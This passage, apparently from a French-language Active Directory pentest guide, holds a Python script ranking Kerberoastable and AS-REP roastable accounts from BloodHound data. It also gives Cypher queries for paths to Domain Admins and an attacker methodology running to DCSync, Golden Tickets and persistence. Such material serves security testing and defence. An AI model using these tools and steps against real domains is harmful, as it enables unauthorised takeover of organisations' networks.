            high_priority.append({
                'type': 'AS-REP Roastable',
                'target': user['Properties']['name'],
                'priority': 'HIGH'
            })
    
    # Chercher Kerberoastable membres de groupes privilegies
    for user in data.get('users', []):
        if user.get('Properties', {}).get('hasspn') == True:
            memberships = user.get('MemberOf', [])
            for group in memberships:
                if 'ADMIN' in group['ObjectIdentifier'].upper():
                    high_priority.append({
                        'type': 'Kerberoastable Admin',
                        'target': user['Properties']['name'],
                        'priority': 'CRITICAL'
                    })
    
    # Trier par priorité
    priority_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
    high_priority.sort(key=lambda x: priority_order[x['priority']])
    
    return high_priority

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <bloodhound_computers.json>")
        sys.exit(1)
    
    targets = analyze_bloodhound_data(sys.argv[1])
    
    print("[*] Prioritized Attack Targets:")
    print("=" * 60)
    for target in targets:
        print(f"[{target['priority']}] {target['type']}: {target['target']}")
```

### 9.3 Script Détection de Chemins d'Attaque

```cypher
// save as attack_paths.cypher
// Usage: cat attack_paths.cypher | cypher-shell -u neo4j -p password

// 1. Shortest paths to DA
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p;

// 2. Computers with exploitable delegation
MATCH (c:Computer)
WHERE c.unconstraineddelegation = true OR c.allowedtodelegate IS NOT NULL
RETURN c.name, c.unconstraineddelegation, c.allowedtodelegate;

// 3. Users with exploitable ACLs on high-value targets
MATCH p=(u:User {name:"USER@DOMAIN.LOCAL"})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner*1..3]->(n {highvalue:true})
RETURN p;

// 4. Sessions of privileged users
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "ADMIN"
MATCH (c:Computer)-[:HasSession]->(u)
RETURN u.name, c.name;
```

---

## Conclusion : Méthodologie de l'Attaquant

**Phase 0 : Foothold**
1. Reconnaissance DNS/SMB/LDAP
2. User enumeration (Kerberos)
3. Password spraying / Exploitation webapp
4. → Obtention de credentials initiaux

**Phase 1 : Enumération**
1. BloodHound collection complète
2. Identification des quick wins :
   - AS-REP Roasting
   - Kerberoasting
   - GPP Passwords
   - LAPS readable

**Phase 2 : Privilège Escalation**
1. Analyse des chemins BloodHound
2. Exploitation ACLs (GenericAll, WriteDacl, etc.)
3. Exploitation délégations (RBCD, Constrained)
4. Exploitation AD CS (ESC1-8)

**Phase 3 : Lateral Movement**
1. Compromission de machines avec sessions admin
2. Credential dumping (Mimikatz, secretsdump)
3. Pass-the-Hash / Pass-the-Ticket
4. → Atteindre un Domain Admin ou équivalent

**Phase 4 : Domain Dominance**
1. DCSync pour dump NTDS
2. Forger Golden Ticket
3. Installer persistence (AdminSDHolder, Skeleton Key, etc.)
4. Pivot vers d'autres domaines via trusts

**Indicateurs de Succès par Phase** :
- Phase 0 : Tu as des creds valides
- Phase 1 : Tu as une cartographie complète du domaine
- Phase 2 : Tu es admin local sur une machine critique
- Phase 3 : Tu as un hash Domain Admin
- Phase 4 : Tu as le hash krbtgt

**Détection = Clé**
- Chaque faille a des **indicateurs spécifiques** (attributs LDAP, flags, configurations)
- Utiliser des **outils automatisés** (BloodHound, Certipy, findDelegation)
- Mais **comprendre les fondamentaux** pour des détections manuelles
- Les faux positifs existent : toujours **vérifier l'exploitabilité réelle**

---

**Ce guide couvre comment DÉTECTER les failles. L'exploitation détaillée est dans le premier document.**
